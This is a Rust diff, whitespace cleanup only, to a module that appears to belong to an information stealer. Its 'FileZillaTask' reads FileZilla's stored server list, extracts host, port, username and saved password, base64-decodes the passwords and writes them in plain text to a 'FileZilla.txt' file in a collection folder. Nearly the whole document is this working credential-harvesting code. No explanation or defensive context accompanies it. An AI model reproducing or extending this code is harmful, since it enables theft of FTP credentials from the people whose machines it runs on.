@@ -12,19 +12,19 @@ pub(super) struct FileZillaTask;
 impl Task for FileZillaTask {
     unsafe fn run(&self, parent: &Path) {
         let servers = collect_servers();
-        
+
         if servers.len() == 0 {
             return;
         }
-        
+
         let mut deduped = Vec::new();
-        
+
         for server in servers {
             if !deduped.contains(&server) {
                 deduped.push(server);
             }
         }
-        
+
         let servers = deduped.iter().map(|server| {
             let password_decoded = base64_decode(server.password.as_bytes())
                 .map(|decoded| String::from_utf8_lossy(&decoded).to_string());
@@ -42,7 +42,7 @@ impl Task for FileZillaTask {
                 password_str
             )
         }).collect::<Vec<_>>().join("\n\n");
-        
+
         let output = parent / "FileZilla.txt";
         let _ = servers.write_to(&output);
     }
@@ -90,12 +90,12 @@ where
 
     let root = xml_doc.DocumentElement().ok()?;
     let servers = root.SelectSingleNode(&HSTRING::from(servers_node.as_ref())).ok()?;
-    
+
     let nodes = servers.SelectNodes(&HSTRING::from("Server")).ok()?;
-    
+
     for i in 0..nodes.Length().ok()? {
         let server = nodes.Item(i).ok()?;
-        
+
         let get_text = |name: &str| -> Option<String> {
             if let Some(child) = server.SelectSingleNode(&HSTRING::from(name)).ok() {
                 Some(child.InnerText().ok()?.to_string_lossy())
@@ -103,20 +103,20 @@ where
                 Some(String::new())
             }
         };
-        
+
         let host = get_text("Host")?;
         let port = get_text("Port")?.parse::<u16>().unwrap_or(0);
         let user = get_text("User")?;
         let password = get_text("Pass")?;
-        
+
         result.push(Server {
             host,
-            port, 
-            user, 
+            port,
+            user,
             password
         })
     }
-    
+
     Some(result)
 }
 
